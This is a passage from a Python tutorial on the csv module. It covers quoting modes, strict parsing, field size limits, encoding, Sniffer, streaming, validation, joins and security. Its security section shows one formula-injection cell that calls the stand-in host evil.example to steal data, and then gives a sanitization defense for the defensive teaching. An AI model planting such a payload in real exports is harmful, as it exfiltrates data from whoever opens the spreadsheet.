value becomes `float`, never `int` — `"30"` unquoted becomes `30.0`,
not `30` — and this conversion applies uniformly to *every* unquoted
field, which can raise `ValueError` unexpectedly if some unquoted
field turns out not to actually be numeric.

### 22.4 `csv.QUOTE_NONE`

```python
writer = csv.writer(f, quoting=csv.QUOTE_NONE, escapechar="\\")
writer.writerow(["Alice", "New York, NY"])
```

```text
Alice,New York\, NY
```

**Behavior on write:** never quote anything — if a field contains the
delimiter, `escapechar` must be supplied, and the delimiter is escaped
in place instead (as shown: `\,`). Writing a field containing the
delimiter *without* an `escapechar` configured raises an error.
**Behavior on read:** the reader treats `quotechar` as an entirely
ordinary character — no quoting interpretation happens at all.
**Practical use case:** genuinely rare — data that is guaranteed never
to contain the delimiter or quote character naturally, or interop with
a system that specifically does not quote. **Caveat:** the least safe
mode in general — prefer `QUOTE_MINIMAL` unless you have a specific,
well-understood reason to avoid quoting entirely.

### 22.5 A brief note on newer, version-specific quoting constants

**Version-specific, and genuinely niche:** Python 3.12 added two
additional quoting constants, `csv.QUOTE_NOTNULL` and
`csv.QUOTE_STRINGS`, giving the writer finer-grained control
specifically over distinguishing `None` values from ordinary strings
(useful when your row data may genuinely contain `None`, not just
strings, and you want that distinction preserved more precisely than
the four classic modes allow). These are recent, narrowly-scoped
additions — if you find yourself needing this level of control,
consult the official `csv` module documentation for your exact Python
version rather than assuming behavior; the four constants in §22.1–§22.4
cover the overwhelming majority of real-world CSV work and are
available on every currently supported Python version.

## 23. Related Parsing Controls: `skipinitialspace` and `strict`

### 23.1 `skipinitialspace`

```
name, age, city
Alice, 30, London
```

```python
reader = csv.reader(f, skipinitialspace=False)   # the default
next(reader)   # ['name', ' age', ' city']  -- leading spaces preserved

reader = csv.reader(f, skipinitialspace=True)
next(reader)   # ['name', 'age', 'city']    -- the single space right after each delimiter is skipped
```

**What it does not mean:** `skipinitialspace=True` skips *only* the
single space character immediately following a delimiter — it is
**not** a general "strip every field's whitespace everywhere" setting.
A field like `"  Alice  "` (spaces on both ends, unrelated to the
delimiter) is unaffected either way — that kind of general cleanup
belongs to your own explicit `.strip()` calls during validation (§21,
§24), not to this parameter.

### 23.2 `strict`

```python
# A deliberately malformed row -- a quoted field is never closed
malformed_line = 'Alice,"broken\n'

reader = csv.reader([malformed_line], strict=True)
next(reader)
```

```text
Traceback (most recent call last):
  ...
_csv.Error: unexpected end of data
```

`strict=False` (the default) tolerates certain kinds of ambiguous or
technically-malformed CSV syntax, doing its best to produce *some*
parsed result rather than raising. `strict=True` instead raises
`csv.Error` immediately upon encountering genuinely malformed syntax
(here, a quoted field that is never closed) —
§24 develops exactly when this stricter behavior is the right
production choice.

## 24. Strict CSV Parsing and Error Handling

### 24.1 When `strict=True` is the right choice

For a production ingestion pipeline processing files whose correctness
genuinely matters (§32, §37, §41), **`strict=True` is very often the
better default**: a file that is subtly malformed should be **rejected
loudly and immediately**, surfacing a clear, actionable failure — not
silently, permissively "parsed" into data that might already be wrong
in ways nobody notices until much later.

### 24.2 `csv.Error`

```python
import csv

try:
    with open("data.csv", "r", newline="", encoding="utf-8") as f:
        reader = csv.reader(f, strict=True)
        for row in reader:
            process(row)
except csv.Error as error:
    print(f"CSV parsing failed: {error}")
```

`csv.Error` is the module's own dedicated exception type, raised for
malformed syntax under `strict=True` (§23.2), an unregistered dialect
name (§21.3), a field exceeding the size limit (§25), and a handful of
other module-specific problems. (Invalid argument *types*, such as a
non-integer passed to `field_size_limit()`, raise `TypeError` instead.)

### 24.3 What to catch, what to log, when to reject vs. quarantine

**Catch `csv.Error`** at the boundary where CSV parsing itself happens
— not deep inside unrelated business logic. **Log enough context to
diagnose the problem later** — at minimum, the file (and, where
available, the approximate row number) being processed, not just the
bare exception message. **Reject the entire file** when the failure
indicates the file's fundamental structure is untrustworthy (wrong
delimiter entirely, corrupted encoding, §26). **Quarantine individual
bad rows** (§32, §37, §51–§52) when the file is *mostly* valid and a
small number of specific rows are the actual problem — a pipeline that
aborts an entire 100,000-row file because of 3 malformed rows is often
far less useful than one that cleanly separates the 99,997 good rows
from the 3 bad ones, with the bad ones reported explicitly.

### 24.4 Why silently ignoring malformed data is dangerous

```python
# BAD -- swallows every parsing problem, and every OTHER kind of problem too
try:
    process(row)
except Exception:
    pass
```

Exactly
[01-reading-and-writing-text-files.md](01-reading-and-writing-text-files.md)'s
§27.3 principle, applied here: silently discarding a malformed row (or
worse, silently discarding *any* exception at all) means real data
problems vanish invisibly — nobody is ever told a row was dropped, why,
or how many times this has happened across a file. §32's validation
functions and §51–§52's end-to-end pipelines both insist on **explicit,
counted, reported** rejection — never silent disappearance.

## 25. Field Size Limit

### 25.1 `csv.field_size_limit()`

```python
import csv

print(csv.field_size_limit())   # 131072  (128 * 1024, the commonly observed default; may vary by build)
```

`csv.field_size_limit()`, called with **no argument**, returns the
current maximum allowed size, in characters, for a single CSV field.

### 25.2 Why this limit exists

Without *some* bound, a single genuinely enormous field (whether from
legitimately unusual data, a corrupted file missing a closing quote, or
a maliciously crafted input) could force the parser to buffer an
unbounded amount of data into memory while still searching for that
field's closing quote — a real resource-exhaustion risk (§28, §41). The
default limit exists specifically as a safety net against this.

### 25.3 Raising the limit, and what it means when you need to

```python
csv.field_size_limit(1_000_000)   # raise the limit to one million characters
```

```text
Traceback (most recent call last):
  ...
_csv.Error: field larger than field limit (131072)
```

The traceback above is what you see *without* first raising the limit,
when a genuinely large field is encountered — `csv.Error`, with a
message naming the exceeded limit. **Raising the limit should be a
deliberate decision, made after confirming the large field is
*legitimate* data** (a genuinely long text field, for example) **rather
than a reflex applied to make an error disappear** — a very large field
can just as easily be a signal that something is malformed (a missing
closing quote causing the parser to keep consuming subsequent rows as
if they were all part of one giant field) as it can be legitimate,
unusually long data.

## 26. Encoding and Newline in CSV

### 26.1 The correct opening pattern, for both reading and writing

```python
with open("data.csv", "r", newline="", encoding="utf-8") as f:
    reader = csv.reader(f)
    ...

with open("output.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.writer(f)
    ...
```

### 26.2 Why `newline=""` specifically matters for `csv`

This directly connects §15.2's `lineterminator` explanation to the
*reading* side as well: the Python `csv` module's official
recommendation is to always open CSV files with `newline=""` — this
disables Python's own universal-newline translation layer entirely,
handing the CSV parser (or writer) full, unmediated control over
exactly where line boundaries fall. Without it, embedded newlines
inside quoted fields (§8.1), and `csv.writer`'s own `\r\n` line
terminator (§15.2), can both be misinterpreted or double-translated by
that separate layer — `newline=""` is the specific, correct fix, not an
optional habit.

### 26.3 Why explicit `encoding="utf-8"` still matters, restated briefly

Every argument
[01-reading-and-writing-text-files.md](01-reading-and-writing-text-files.md)'s
§25 already made for plain text files applies identically to CSV files
— CSV is still, underneath, ordinary text (§4.1), and omitting
`encoding=` still risks a platform-dependent default. This chapter does
not repeat that full lesson; [05-encodings-and-newlines.md](05-encodings-and-newlines.md)
remains the dedicated deep dive.

### 26.4 The UTF-8 BOM, briefly

```python
with open("exported_from_excel.csv", "r", newline="", encoding="utf-8-sig") as f:
    reader = csv.DictReader(f)
```

Some tools (notably Excel, on Windows) prepend a **BOM** (byte-order
mark) — a few invisible bytes signaling "this file is UTF-8" — to CSV
files they export. Opened with plain `encoding="utf-8"`, that BOM
shows up as a stray, invisible character glued onto the *first* header
name (`﻿name` instead of `name`), which silently breaks any
`row["name"]` lookup on that specific column. `encoding="utf-8-sig"`
reads (and correctly discards) that BOM automatically — worth using
whenever a CSV file's origin is, or might be, Excel-on-Windows. Full
BOM and platform-newline mechanics remain
[05-encodings-and-newlines.md](05-encodings-and-newlines.md)'s own
subject.

## 27. Sniffing CSV Format

### 27.1 `csv.Sniffer`

```python
import csv

with open("mystery.csv", "r", newline="", encoding="utf-8") as f:
    sample = f.read(2048)
    f.seek(0)

    sniffer = csv.Sniffer()
    dialect = sniffer.sniff(sample)
    has_header = sniffer.has_header(sample)

    reader = csv.reader(f, dialect=dialect)
```

`csv.Sniffer()` creates a sniffer object. `.sniff(sample)` examines a
representative chunk of raw text and attempts to **guess** a dialect
(delimiter, quoting) from it, returning a dialect-like object usable
directly with `csv.reader`/`csv.writer`. `.has_header(sample)`
separately attempts to guess whether the sample's first row looks like
a header rather than genuine data, returning a `bool`.

### 27.2 What Sniffer is actually doing, and why it is heuristic, not guaranteed

`Sniffer` works by examining patterns in the sample — which candidate
delimiter characters appear with suspiciously *consistent* frequency
across lines, whether the first row's values look structurally
different (e.g. all non-numeric text) from the rows that follow. This
is **inference from statistical patterns in a sample**, not a
guaranteed, formally correct detection — it can, and does, guess wrong.

### 27.3 Failure modes

- **Small datasets** — too little data for any pattern to be
  statistically reliable.
- **Ambiguous delimiters** — a file where more than one candidate
  character (e.g. both comma and semicolon) appear with similar,
  plausible-looking frequency.
- **Unusual data** — legitimate fields that happen to contain the
  delimiter character frequently, confusing the frequency-based
  guess.
- **Inconsistent rows** — genuinely ragged data (§25 of the previous
  chapter's spirit, applied to structure rather than content) defeats
  pattern-based inference.
- **Numeric-only data** — `.has_header()` specifically relies on the
  first row looking *different in kind* from the rows that follow;
  numeric-only data (where a header like `2024,2025,2026` could itself
  look like data) can fool this heuristic in either direction.
- **Misleading headers** — a header row that happens to contain
  plausible-looking "data," or data rows that happen to look
  header-like.

### 27.4 Why production systems should not blindly trust automatic detection

**`Sniffer`'s output should be treated as a starting *suggestion*, not
a trusted final answer**, in any pipeline where correctness genuinely
matters. A defensible pattern: use `Sniffer` to produce a candidate
dialect, then **validate** the result against known expectations (an
expected set of column names, an expected number of columns, §32)
before committing to it — never feed `Sniffer`'s raw guess directly
into a production ingestion path with no verification step at all.

## 28. Large CSV Processing

### 28.1 What not to do

```python
# AVOID for large files -- loads every row into memory at once
with open("huge.csv", "r", newline="", encoding="utf-8") as f:
    reader = csv.reader(f)
    rows = list(reader)
```

Exactly mirroring
[01-reading-and-writing-text-files.md](01-reading-and-writing-text-files.md)'s
§30 lesson about `f.read()`/`f.readlines()` on huge text files:
`list(reader)` forces *every single row* to be parsed and held in
memory simultaneously — for a file with millions of rows, this can
exhaust available memory long before processing even begins.

### 28.2 The streaming approach

```python
with open("huge.csv", "r", newline="", encoding="utf-8") as f:
    reader = csv.reader(f)
    next(reader)   # skip header

    total_active = 0
    for row in reader:
        if row[3] == "active":
            total_active += 1

print(f"Active rows: {total_active}")
```

This processes a file of **any** number of rows — thousands or tens of
millions — without memory growing with the file's row count (memory
still depends on the size of the current row and any state you keep),
because
`csv.reader` is already a lazy iterator (§12.2): each `for` step parses
and yields exactly one row, which is then discarded (freed for garbage
collection) once the loop moves on to the next.

### 28.3 Streaming applies to writing too

```python
def process_large_file(input_path, output_path):
    with open(input_path, "r", newline="", encoding="utf-8") as infile, \
         open(output_path, "w", newline="", encoding="utf-8") as outfile:
        reader = csv.reader(infile)
        writer = csv.writer(outfile)

        header = next(reader)
        writer.writerow(header)

        for row in reader:
            if row[3] == "active":
                writer.writerow(row)
```

Reading a row, deciding what to do with it, and writing (or not
writing) the result — all within the same loop iteration — is exactly
the "file → chunks/lines → processing" shape
[01-reading-and-writing-text-files.md](01-reading-and-writing-text-files.md)'s
§20.5 already connected to real data-engineering pipelines; here, that
same shape scales to genuinely enormous CSV files, "conceptually
without loading everything into memory," by construction.

## 29. Transformation Pipelines

### 29.1 The standard shape

```
input.csv
    ↓  READ (csv.reader / csv.DictReader)
    ↓  VALIDATE (§21)
    ↓  CONVERT (§24)
    ↓  TRANSFORM (business logic)
    ↓  WRITE (csv.writer / csv.DictWriter)
output.csv
```

### 29.2 A complete, beginner-friendly example

```python
import csv


def celsius_to_fahrenheit(celsius: float) -> float:
    return celsius * 9 / 5 + 32


def process_weather_data(input_path: str, output_path: str) -> None:
    with open(input_path, "r", newline="", encoding="utf-8") as infile, \
         open(output_path, "w", newline="", encoding="utf-8") as outfile:

        reader = csv.DictReader(infile)
        writer = csv.DictWriter(outfile, fieldnames=["city", "celsius", "fahrenheit"])
        writer.writeheader()

        for row in reader:
            celsius = float(row["celsius"])
            writer.writerow({
                "city": row["city"],
                "celsius": celsius,
                "fahrenheit": round(celsius_to_fahrenheit(celsius), 1),
            })
```

Each stage is visible directly in the code: `DictReader` (read),
`float(row["celsius"])` (convert — no validation yet, deliberately kept
simple here; §32 adds it properly), `celsius_to_fahrenheit(...)`
(transform — a small, pure, independently testable function), and
`DictWriter`/`writerow()` (write).

## 30. Validation and Data Quality

### 30.1 What to validate

- **Required columns** — does the header actually contain every column
  the rest of the program assumes exists?
- **Row length** — does every row (for `csv.reader`-based code) have
  the expected number of fields?
- **Missing values** — is a field present but empty, or absent
  entirely (§23)?
- **Invalid types** — does a field that should be numeric actually
  parse as a number (§24)?
- **Unexpected values** — does a field fall within an expected set or
  range (a `status` column only ever `"active"`/`"inactive"`, for
  example)?
- **Duplicate identifiers** — does a column meant to be unique (a
  customer ID, for example) actually contain only unique values (§25)?
- **Malformed rows** — rows `DictReader` collected extras/missing
  values for (§17.3), which may themselves indicate a deeper structural
  problem.

### 30.2 A reusable row-validation function

```python
def validate_customer_row(row: dict[str, str]) -> list[str]:
    errors = []

    if not row.get("customer_id", "").strip():
        errors.append("missing customer_id")

    if not row.get("name", "").strip():
        errors.append("missing name")

    age_text = row.get("age", "").strip()
    if age_text:
        try:
            age = int(age_text)
            if age < 0 or age > 130:
                errors.append(f"implausible age: {age}")
        except ValueError:
            errors.append(f"invalid age: {age_text!r}")

    return errors
```

`validate_customer_row` returns a **list of problem descriptions**
(empty if the row is valid) rather than raising an exception or
returning a bare `bool` — this lets a caller report *every* problem
with a given row at once, rather than stopping at the first one, and
lets the caller decide what "invalid" should mean for its own purposes
(reject the row? log a warning? both?).

### 30.3 Why validation belongs at the boundary

Directly
[01-reading-and-writing-text-files.md](01-reading-and-writing-text-files.md)'s
§3 principle, and
[02-pathlib-and-portable-paths.md](02-pathlib-and-portable-paths.md)'s
§27.1, applied here to CSV rows specifically: validate immediately
after reading, *before* any business logic runs — so that everything
downstream of validation can safely assume it is working with clean,
well-formed data, rather than re-checking the same assumptions
repeatedly, scattered throughout the codebase.

## 31. Schema Concepts

### 31.1 CSV's weak schema guarantees

Unlike a database table, a CSV file enforces **nothing** about its own
structure — nothing stops a file from having a different number of
columns on different rows, a numeric-looking column that occasionally
contains text, or a header that simply does not match what a program
downstream expects. The header row is a *convention*, not an enforced
contract.

### 31.2 A logical schema, defined explicitly by your program

```python
CUSTOMER_SCHEMA = {
    "customer_id": int,
    "name": str,
    "balance": float,
    "created_at": str,   # parsed to datetime separately, per §10.3
}
```

A **logical schema**, in this sense, is simply your own program's
explicit statement of what columns it expects, and what type/shape each
one should ultimately have — CSV itself does not provide this; your
code does, deliberately, exactly as §30.2's `validate_customer_row`
began to do informally.

### 31.3 Why production systems validate against an explicit schema

Without an explicit schema check at the boundary, a silently
reordered, renamed, or dropped column upstream (in whatever system
produced the CSV file) can flow directly into your program's logic
undetected — `row["balance"]` might silently start returning what was
actually meant to be the `created_at` column, with no error raised
anywhere, simply because the *position* changed while the *header
name* your code happens to look up did not exist at all. An explicit,
upfront check — "does this file's header contain exactly the columns I
expect?" (§32.2 shows this concretely) — turns that class of silent,
hard-to-diagnose failure into an immediate, clear one.

## 32. Missing Values

### 32.1 CSV's fundamental ambiguity

```
name,age
Alice,
Bob,unknown
Charlie,NULL
```

CSV has **no universal representation for "no value"** — an empty
field (`Alice`'s age), the literal text `"unknown"`, and the literal
text `"NULL"` are, as far as the CSV format itself is concerned, three
completely different, equally valid *strings* — nothing in the format
tells you any of them specifically means "missing."

### 32.2 Real-world missing-value conventions you will encounter

Empty string (nothing between two delimiters); the literal text
`NULL` or `null`; `NA` or `N/A`; sometimes even a specific sentinel
number (`-1`, `9999`) in older or poorly-designed systems. **Your
application must define, explicitly, which of these (if any) a given
column treats as "missing," rather than assuming any one universal
convention.**

### 32.3 A reusable missing-value check

```python
MISSING_MARKERS = {"", "null", "na", "n/a", "unknown"}


def is_missing(value: str) -> bool:
    return value.strip().lower() in MISSING_MARKERS
```

This function makes the missing-value convention **explicit and
inspectable**, in one place, rather than scattered as ad hoc checks
(`if value == ""` here, `if value == "NULL"` there) throughout a
codebase.

## 33. Type Conversion

### 33.1 Reusable conversion functions

```python
def parse_int(value: str, *, default: int | None = None) -> int | None:
    value = value.strip()
    if not value:
        return default
    try:
        return int(value)
    except ValueError:
        raise ValueError(f"Not a valid integer: {value!r}") from None


def parse_float(value: str, *, default: float | None = None) -> float | None:
    value = value.strip()
    if not value:
        return default
    try:
        return float(value)
    except ValueError:
        raise ValueError(f"Not a valid float: {value!r}") from None


def parse_bool(value: str) -> bool:
    normalized = value.strip().lower()
    if normalized in {"true", "yes", "1"}:
        return True
    if normalized in {"false", "no", "0"}:
        return False
    raise ValueError(f"Not a valid boolean: {value!r}")
```

### 33.2 What each one handles deliberately

**Whitespace** — `.strip()` before any check, so `" 30 "` is treated
the same as `"30"`. **Empty values** — `parse_int`/`parse_float` accept
an explicit `default`, so the caller decides deliberately what an empty
field should become, rather than the function silently guessing.
**Invalid values** — every conversion re-raises with a clear, specific
message naming the actual offending text, rather than letting Python's
own generic `ValueError` message (which does not include which *field*
or *row* was involved) propagate unexplained. **`parse_bool` never
silently succeeds on ambiguous input** — directly fixing §10.2's
`bool("false")` trap, by explicitly mapping only a known, deliberate
set of textual representations, and raising for anything else rather
than guessing.

### 33.3 A brief preview: date parsing

```python
from datetime import datetime


def parse_date(value: str, fmt: str = "%Y-%m-%d") -> datetime:
    try:
        return datetime.strptime(value.strip(), fmt)
    except ValueError:
        raise ValueError(f"Not a valid date ({fmt}): {value!r}") from None
```

Shown here only as a preview of the same pattern applied to dates —
full `datetime` handling (timezones, formats, timestamps) is
[Datetime, Timezones, and Timestamps](../09-Advanced-Production-Oriented-Python-Foundations/07-datetime-timezones-and-timestamps.md)'s
own dedicated subject, much later in the roadmap.

## 34. Duplicate Data

### 34.1 Duplicate header names

```
name,age,name
Alice,30,Smith
```

`csv.DictReader` does not raise an error for a duplicate column name —
it simply lets the *later* occurrence silently overwrite the earlier
one in the resulting dictionary (since a `dict` can only hold one value
per key). Given the header above, `row["name"]` ends up holding
`"Smith"` — the *second* `name` column's value — with the *first*
`name` column's value (`"Alice"`) **silently discarded entirely**, with
no warning. **This is exactly the kind of silent data loss §24.4
warned about, now specific to duplicate headers** — validating the
header explicitly (checking for duplicate names before trusting
`DictReader`'s output, §32.2) is the correct defense.

### 34.2 Duplicate identifiers (IDs)

```python
def find_duplicate_ids(rows: list[dict[str, str]], id_column: str) -> set[str]:
    seen = set()
    duplicates = set()
    for row in rows:
        value = row[id_column]
        if value in seen:
            duplicates.add(value)
        seen.add(value)
    return duplicates
```

A column *intended* to be unique (a customer ID, a transaction ID) is
not automatically enforced as unique by CSV or by `csv.DictReader` in
any way — detecting duplicates, and deciding what to do about them
(reject the file? keep the first occurrence? keep the last? flag both
for manual review?), is entirely the application's own responsibility.

### 34.3 Duplicate rows

Two rows that are *identical in every field* are a distinct problem
from duplicate IDs — they can indicate the same source record was
accidentally included twice (e.g. an upstream export ran more than
once). Detecting them is a straightforward extension of §34.2's
pattern, keyed on the *entire row's* content (as a `tuple`, since
`tuple`s, unlike `dict`s, are hashable and can go in a `set`) rather
than on one specific ID column alone.

## 35. Filtering and Aggregation

### 35.1 Filtering rows

```python
with open("customers.csv", "r", newline="", encoding="utf-8") as f:
    reader = csv.DictReader(f)
    active_customers = [row for row in reader if row["status"] == "active"]
```

### 35.2 Selecting specific columns

```python
names_only = [row["name"] for row in active_customers]
```

### 35.3 Counting, summing, grouping, min/max, averages

```python
from collections import defaultdict

with open("transactions.csv", "r", newline="", encoding="utf-8") as f:
    reader = csv.DictReader(f)

    total_by_category = defaultdict(float)
    count = 0
    amounts = []

    for row in reader:
        amount = float(row["amount"])
        total_by_category[row["category"]] += amount
        amounts.append(amount)
        count += 1

print(f"Total records: {count}")
print(f"Totals by category: {dict(total_by_category)}")
print(f"Max: {max(amounts)}, Min: {min(amounts)}, Average: {sum(amounts) / count}")
```

`defaultdict(float)` (a preview of
[Counter, defaultdict, and deque](../09-Advanced-Production-Oriented-Python-Foundations/08-counter-defaultdict-and-deque.md),
later in the roadmap) conveniently starts each new category's running
total at `0.0` automatically, avoiding a manual "is this key already
present?" check — the same accumulator pattern
[01-reading-and-writing-text-files.md](01-reading-and-writing-text-files.md)'s
§20.3 already established, applied here to CSV rows.

### 35.4 Memory implications when aggregating large datasets

Streaming accumulation (§35.3's pattern — one running total per
category, updated as each row streams by) uses memory proportional to
the *number of distinct categories*, not the number of rows — this
remains efficient even for a file with millions of rows, as long as the
number of distinct groups stays reasonably small. Collecting every
individual `amounts` value into a growing list (as shown, purely to
compute min/max/average afterward) *does* grow with row count — for a
genuinely huge file, computing a running minimum/maximum/sum/count
directly, without retaining every individual value, avoids that
growth entirely.

## 36. CSV-to-CSV Processing

### 36.1 A simple join, using a dictionary lookup

```python
customers_by_id: dict[str, dict[str, str]] = {}
with open("customers.csv", "r", newline="", encoding="utf-8") as f:
    for row in csv.DictReader(f):
        customers_by_id[row["customer_id"]] = row

with open("transactions.csv", "r", newline="", encoding="utf-8") as f:
    for row in csv.DictReader(f):
        customer = customers_by_id.get(row["customer_id"])
        if customer is None:
            print(f"Unknown customer_id: {row['customer_id']}")
            continue
        print(f"{customer['name']} spent {row['amount']}")
```

`customer_id` acts as the **key** shared between the two files —
`customers.csv` is loaded once, fully, into a dictionary keyed by that
ID (a reasonable trade-off when the "lookup" side is small enough to
comfortably fit in memory, even if `transactions.csv` itself is
streamed, §28), and `transactions.csv` is then streamed, looking up
each transaction's matching customer as it goes.

### 36.2 One-to-one vs. one-to-many, missing keys, duplicate keys

**One-to-one** — each `customer_id` in `transactions.csv` matches
exactly one row in `customers.csv`: the pattern above. **One-to-many**
— a `customer_id` might appear in *many* transaction rows, matched
against a *single* customer row: still handled correctly by §36.1's
pattern, since the lookup dictionary is built once and reused for every
matching transaction. **Missing keys** — a `transactions.csv` row whose
`customer_id` does not exist in `customers.csv` at all — handled
explicitly above via `.get(...)` returning `None`, rather than letting
a `KeyError` crash the whole run. **Duplicate keys in the lookup file
itself** — exactly §34.2's problem, applied here: if `customers.csv`
has two rows with the same `customer_id`, the dictionary-building loop
silently keeps only the *last* one seen, discarding the earlier row —
worth detecting explicitly (§34.2) before trusting the lookup is
actually one-to-one. **This is not a complete relational-database
lesson** — no joins beyond this simple, single-key lookup pattern, and
no discussion of join types beyond what is shown here; that belongs to
a much later, dedicated database topic.

## 37. Security

### 37.1 CSV injection (formula injection)

```
name,notes
Alice,=HYPERLINK("http://evil.example/steal?data="&A1,"Click me")
```

Many spreadsheet applications (Excel, and others) **automatically
interpret a cell's content as a formula** if it begins with certain
characters — `=`, `+`, `-`, or `@` — regardless of the fact that the
data came from a plain CSV text field, not a deliberately authored
spreadsheet formula. If your program exports **untrusted, user-supplied
text** directly into a CSV field, and that CSV is later opened in
spreadsheet software, a field crafted to begin with one of these
characters can execute as a live formula — potentially exfiltrating
data, triggering an external request, or worse, entirely within the
context of whoever opens that spreadsheet.

### 37.2 Why this is a real, practical risk, not a theoretical one

Any system that lets users submit free-text data (a name, a comment, an
address) which is later exported to CSV, for eventual opening in a
spreadsheet application by *someone else*, is potentially exposed —
this is a well-known, real vulnerability class, not a hypothetical
edge case.

### 37.3 A defensive mitigation pattern

```python
FORMULA_TRIGGER_CHARS = ("=", "+", "-", "@")


def sanitize_for_spreadsheet(value: str) -> str:
    if value and value[0] in FORMULA_TRIGGER_CHARS:
        return "'" + value   # a leading apostrophe forces spreadsheet software to treat this as plain text
    return value
```

CSV itself never executes formulas; it is the spreadsheet application
that may interpret a value as one. Prefixing a value that begins with a
trigger character with a leading apostrophe (`'`) is a common, practical
mitigation — many spreadsheet applications treat a leading apostrophe as
"force this cell to be read as literal text," though behavior is
application-dependent, so choose a mitigation suited to your target
application. Note that sanitizing alters the exported representation
(the apostrophe may appear as data in some programs).
**This is a defensive sanitization pattern to be aware of and apply
when exporting untrusted data for spreadsheet consumption — not
instructions for exploiting the vulnerability**, which this chapter
deliberately does not provide beyond what is necessary to recognize and
defend against the issue.

### 37.4 Other CSV-related security considerations

**Untrusted files as input** — a CSV file from an untrusted source
should be validated (§30–§32) before its data is trusted for any
downstream decision. **Resource exhaustion** — an extremely large file,
or a file with an extremely large individual field (§25), can be used
to exhaust memory or processing time if no limits are enforced;
`csv.field_size_limit()` (§25) and streaming (§28) are both part of the
defense. **Malformed input as an attack surface** — `strict=True`
(§24.1) rejecting malformed data loudly, rather than a permissive
parser silently guessing at ambiguous structure, reduces the chance
that carefully crafted malformed input produces unexpected, exploitable
parsing behavior. **Path security** — briefly noted only: any path
associated with reading or writing a CSV file (a user-specified output
location, for example) should be validated exactly as
[02-pathlib-and-portable-paths.md](02-pathlib-and-portable-paths.md)'s
§28 (path traversal) already taught — that full lesson is not repeated
here.

## 38. CSV and Databases/JSON

### 38.1 What CSV is genuinely good for

Data **interchange** between systems that do not share a common
database; simple **exports** and **imports**; **simple pipelines**
where a human might need to open and directly inspect the data;
straightforward **batch processing** of tabular data.

### 38.2 What CSV is weak for

**Transactions** — CSV has no concept of "these several changes either
all happen or none do." **Concurrent updates** — two processes writing
to the same CSV file at once have no coordination mechanism at all
(directly the same class of problem
[01-reading-and-writing-text-files.md](01-reading-and-writing-text-files.md)'s
§43 described for plain text files). **Relational constraints** —
nothing enforces that a `customer_id` referenced in `transactions.csv`
actually exists in `customers.csv` (§36.2's missing-key case is
entirely unenforced by the format itself). **Complex/nested schemas** —
CSV is fundamentally flat, two-dimensional data; nested or hierarchical
structures do not fit naturally (this is exactly where
[04-json-and-serialization.md](04-json-and-serialization.md)'s subject
becomes the better fit, though this chapter does not duplicate that
lesson). **Efficient random access** — finding "row number 4,000,000"
in a CSV file generally still means reading through everything before
it; there is no built-in indexing. **Large analytical workloads** —
repeated, complex queries across large CSV datasets are dramatically
less efficient than a real database engine purpose-built for exactly
that.

### 38.3 CSV vs. JSON vs. database, conceptually

| | CSV | JSON | Database |
|---|---|---|---|
| **Shape** | Flat, tabular | Nested, hierarchical | Structured, relational (typically) |
| **Type enforcement** | None — everything is text (§10) | Some — numbers, booleans, `null` are native | Strong — enforced by schema |
| **Human-readable** | Yes | Yes | Not directly (queried instead) |
| **Best for** | Simple tabular interchange | Nested/structured interchange, config, APIs | Persistent, queryable, concurrent, relational data |

This is a conceptual comparison only — full JSON handling is
[04-json-and-serialization.md](04-json-and-serialization.md)'s own
subject, and full database concepts belong to a much later part of the
roadmap.

## 39. Data Engineering Applications

### 39.1 Where CSV appears in a real pipeline

```
source system
    ↓
CSV landing zone (raw, as received)
    ↓
validation (§30-§32)
    ↓
transformation (§29)
    ↓
clean dataset
    ↓
warehouse / database
```

### 39.2 The stages, briefly

**Ingestion** — a CSV file arrives, from an upstream system, an export,
or an API. **Staging** — the raw file is kept, unmodified, exactly as
received (a **landing zone**) before any processing touches it — useful
for reprocessing and auditing if something downstream turns out to be
wrong. **Validation** — §30–§32's checks, applied systematically.
**Transformation** — §29's pipeline shape, converting validated raw
data into the shape downstream systems actually need. **Data quality**
— tracking *how much* data failed validation, and why, not just
discarding it (§40, §51–§52). **Quarantine** — rows or files that fail
validation are set aside, explicitly, rather than silently dropped or
allowed to corrupt the clean dataset. **Observability** — every stage
reports enough information (counts, specific failures) for a human to
understand what happened, without needing to re-run the pipeline just
to find out.

### 39.3 How this connects to future Applied AI/data-engineering work

This exact landing-zone → validate → transform → clean-dataset shape is
the direct ancestor of real ETL/ELT pipelines you will build later in
this roadmap — the specific tools will grow more sophisticated, but the
underlying discipline (never trust raw input, validate explicitly,
never silently discard problems) does not change.

## 40. AI/ML Applications

### 40.1 Realistic uses of CSV in AI/ML work

**Training datasets** — tabular features and labels, especially for
classical ML. **Evaluation datasets** — held-out examples for measuring
model performance. **Metadata and annotations** — labels, tags, or
human-review notes associated with other artifacts. **Experiment
outputs** — metrics logged across training runs, one row per run or per
step. **Feature exports** — precomputed feature values, exported for
downstream model training. **Batch inference inputs/outputs** — a batch
of inputs to run through a model, and the corresponding batch of
predictions, both naturally tabular.

### 40.2 Where CSV is, and is not, appropriate

CSV is a genuinely good fit for **small-to-medium tabular datasets** —
exactly what this chapter's examples have shown. It is **not**
appropriate for embedding **audio, images, or large tensors** directly
— these are binary, not text, and do not fit CSV's fundamental nature
(§4.1) at all — nor is it well-suited to **high-volume, distributed
datasets**, where dedicated, purpose-built formats and storage systems
exist specifically because CSV's simplicity becomes a liability at that
scale.

### 40.3 CSV as a pointer to other artifacts

A very common, practical pattern: a CSV file's rows contain **paths or
URIs pointing to** the actual binary artifacts (an `image_path` column
referencing a `.png` file on disk, or in cloud storage), rather than
attempting to embed that binary data directly inside the CSV itself —
this keeps the CSV file itself small, human-readable, and easy to
process with everything this chapter has taught, while the (often much
larger) binary data lives separately, referenced by path.

## 41. Reusable CSV Utilities

### 41.1 A small, focused function set

```python
from pathlib import Path
from typing import Iterator


def read_csv_rows(path: Path) -> Iterator[list[str]]:
    with path.open("r", newline="", encoding="utf-8") as f:
        reader = csv.reader(f)
        yield from reader


def read_csv_dicts(path: Path) -> Iterator[dict[str, str]]:
    with path.open("r", newline="", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        yield from reader


def write_csv_rows(path: Path, rows: Iterator[list[str]]) -> None:
    with path.open("w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerows(rows)


def write_csv_dicts(path: Path, fieldnames: list[str], rows: Iterator[dict[str, str]]) -> None:
    with path.open("w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(rows)
```

### 41.2 Design notes

**Separation of concerns** — each function does exactly one thing:
read as lists, read as dicts, write lists, write dicts — directly
